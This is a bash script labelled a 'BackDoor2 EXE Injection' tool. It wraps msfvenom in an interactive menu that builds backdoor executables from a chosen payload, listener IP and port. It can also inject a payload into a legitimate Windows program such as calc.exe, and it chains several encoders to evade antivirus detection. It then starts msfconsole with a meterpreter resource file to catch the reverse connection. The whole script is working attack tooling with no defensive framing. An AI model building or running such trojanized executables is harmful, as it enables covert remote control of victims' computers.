#!/bin/bash
#
# msfvenom

echo "##########################################"
echo "##BackDoor2 EXE Injection script by ioxx##"
echo "###############Venom######################"
echo "##########################################"


if [ "$(id -u)" != "0" ]; then
   echo "> This script must be run as root" 1>&2
   exit 1
fi

ping localhost -c 5 >nul
echo "------------------------"
echo "IoXx Backdoor msfvenom  "
echo -e "1.>Generate BackDoor "
echo -e "2.>Make Infected EXE "
echo -e "3.>Show Encoders     "
echo -e "4.>Show Payloads     "
echo -e "5.>Show nops         "
echo -e "6.>Multi Encoded     "
echo -e "7.>find local ip     "
echo "------------------------"
echo -e "What method:> \c"

read Answers

if [ "$Answers" = "1" ]; then

echo -e "*Your Remote IP:> \c"
read MyIP
echo -e "Port Listener:> \c"
read MyPort
echo -e "What payload do you want to use?"
read MyPayload
echo -e "What encoder do you want to use?"
read Myencc
echo -e "*How many times to encode 1-30:> \c"
read MyENC
echo -e "What platform?"
read MyPlat
echo -e "What Arch to use?"
read MyArch
echo "Path /root/Desktop/backdoor.exe"
echo -e "* path of exe for injection:> \c"
read pathA
msfvenom -b "\x01\x00" --platform $MyPlat -a $MyArch -n 5 -p $MyPayload LHOST=$MyIP LPORT=$MyPort -e $Myencc -i $MyENC  -f exe > $pathA

echo -e "Do you want to start Msfconsole:?> \c"
read msff

if [ "$msff" = "yes" ]; then
clear
msfconsole -r meterpreter.rc
else
  clear
sudo ./ioxx*
fi

else

if [ "$Answers" = "2" ]; then
echo -e "*Your Remote IP:> \c"
read MyIP
echo -e "Port Listener:> \c"
read MyPort
echo -e "What payload do you want to use?"
read MyPayload
echo -e "What encoder do you want to use?"
read Myencc
echo -e "*How many times to encode 1-20:> \c"
read MyENC
echo -e "What platform?"
read MyPlat
echo -e "What Arch to use?"
read MyArch
echo "Path /root/Desktop/calc.exe"
echo -e "* path of exe for injection:> \c"
read pathA
echo "Path /root/Desktop/calc2.exe"
echo -e "* Output path of Infected exe:> \c"
read pathB
msfvenom -b "\x00\x01" -p $MyPayload LHOST=$MyIP LPORT=$MyPort --platform $MyPlat -a $MyArch -x $pathA -k -e $Myencc -i $MyENC -f exe > $pathB
echo -e "Do you want to start Msfconsole:?> \c"
read msff1

if [ "$msff1" = "yes" ]; then
clear
msfconsole -r meterpreter.rc
else
  clear
sudo ./ioxx*
fi

else

if [ "$Answers" = "3" ]; then
xterm -hold -e  msfvenom -l encoders
clear
sudo ./ioxx*

else 

if [ "$Answers" = "4" ]; then
xterm -hold -e  msfvenom -l payloads
clear
sudo ./ioxx*

else

if [ "$Answers" = "5" ]; then
xterm -hold -e msfvenom -l nops
clear
sudo ./ioxx*

else

if [ "$Answers" = "7" ]; then
xterm -hold -e ifconfig
clear
sudo ./ioxx*

else

if [ "$Answers" = "6" ]; then
clear
echo "##########################################"
echo "##BackDoor2 EXE Injection script by ioxx##"
echo "###############Venom######################"
echo "##########################################"
echo "------------------------"
echo "      Multi encoded     "
echo -e "1.>Generate BackDoor "
echo -e "2.>Make Infected EXE "
echo "------------------------"
echo -e "What method:> \c"

read Answerss

if [ "$Answerss" = "1" ]; then
echo -e "*Your Remote IP:> \c"
read MyIP
echo -e "Port Listener:> \c"
read MyPort
echo -e "What payload do you want to use?"
read MyPayload
echo -e "What encoder do you want to use?1"
read Myencc
echo -e "What encoder do you want to use?2"
read MyenccTwo
echo -e "What encoder do you want to use?3"
read MyenccThree
echo -e "*How many times to encode 1-30:1> \c"
read MyENC
echo -e "*How many times to encode 1-30:2> \c"
read MyENCTwo
echo -e "*How many times to encode 1-30:3> \c"
read MyENCThree
echo -e "What platform?"
read MyPlat
echo -e "What Arch to use?"
read MyArch
echo "Path /root/Desktop/backdoor.exe"
echo -e "* path of exe for injection:> \c"
read pathA
msfvenom -p $MyPayload LHOST=$MyIP LPORT=$MyPort -f raw -e $Myencc -i $MyENC | msfvenom -a $MyArch --platform $MyPlat -e $MyenccTwo -i $MyENCTwo  -f raw | msfvenom -a $MyArch --platform $MyPlat -e $MyenccThree -i $MyENCThree -f exe -o $pathA
echo -e "Do you want to start Msfconsole:?> \c"
read msff1

if [ "$msff1" = "yes" ]; then
clear
msfconsole -r meterpreter.rc
else
  clear
sudo ./ioxx*
fi

else

if [ "$Answerss" = "2" ]; then
echo -e "*Your Remote IP:> \c"
read MyIP
echo -e "Port Listener:> \c"
read MyPort
echo -e "What payload do you want to use?"
read MyPayload
echo -e "What encoder do you want to use?1"
read Myencc
echo -e "What encoder do you want to use?2"
read MyenccTwo
echo -e "What encoder do you want to use?3"
read MyenccThree
echo -e "*How many times to encode 1-30:1> \c"
read MyENC
echo -e "*How many times to encode 1-30:2> \c"
read MyENCTwo
echo -e "*How many times to encode 1-30:3> \c"
read MyENCThree
echo -e "What platform?"
read MyPlat
echo -e "What Arch to use?"
read MyArch
echo "Path /root/Desktop/calc.exe"
echo -e "* path of exe for injection:> \c"
read pathA
echo "Path /root/Desktop/calc2.exe"
echo -e "* Output path of Infected exe:> \c"
read pathB
msfvenom -p $MyPayload LHOST=$MyIP LPORT=$MyPort -f raw -e $Myencc -i $MyENC | msfvenom -a $MyArch --platform $MyPlat -e $MyenccTwo -i $MyENCTwo  -f raw | msfvenom -a $MyArch --platform $MyPlat -e $MyenccThree -i $MyENCThree -x $pathA -k  -f exe -o $pathB
echo -e "Do you want to start Msfconsole:?> \c"
read msff1

if [ "$msff1" = "yes" ]; then
clear
msfconsole -r meterpreter.rc
else
  clear
sudo ./ioxx*

fi
fi

fi

fi
fi

fi 
fi 
fi 
fi
fi
